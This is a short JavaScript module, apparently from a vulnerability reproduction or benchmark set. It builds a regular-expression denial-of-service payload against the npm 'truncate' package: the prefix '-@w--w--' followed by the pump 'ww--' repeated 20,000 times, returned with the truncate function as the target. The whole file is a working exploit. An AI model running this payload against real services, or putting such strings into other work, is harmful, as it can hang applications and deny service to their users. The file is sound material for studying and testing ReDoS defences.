function getPayload() {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime; // Ensure measureTime is imported
  const truncate = require("truncate");

  let prefix = "-@w--w--";
  let pump = "ww--";
  let suffix = "";
  let nPumps = 20000;

  let attackString = prefix;
  for (var i = 0; i < nPumps; i++) {
    attackString += pump;
  }

  attackString += suffix;

  return {
    input: "Hey " + attackString,
    truncateFunction: truncate
  };
}

module.exports = { getPayload };